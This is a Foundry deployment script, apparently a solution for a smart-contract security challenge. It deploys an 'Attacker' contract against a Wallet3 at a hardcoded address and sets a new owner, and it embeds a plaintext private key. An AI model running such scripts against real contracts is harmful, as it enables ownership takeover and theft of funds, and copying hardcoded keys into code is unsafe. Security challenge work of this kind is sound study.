// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Wallet3} from "../src/Wallet3.sol";
import {Proxy} from "../src/Proxy.sol";
import {Attacker} from "../src/Attacker.sol";

contract Attack is Script {
    function run() public {
        uint256 key = 0xbae59a37d25cba3c346674ed6ce224d9eb3b88ad081774961769f9c94a3ce969;
        vm.startBroadcast(key);

        address newOwner = vm.createWallet(key).addr;
        Attacker attacker = new Attacker(Wallet3(payable(0xe6Cc6358e23fCb274c0E0696D6f9635BD9f223b1)));
        attacker.setNewOwner(newOwner);
        console.log(address(attacker));
    }
}
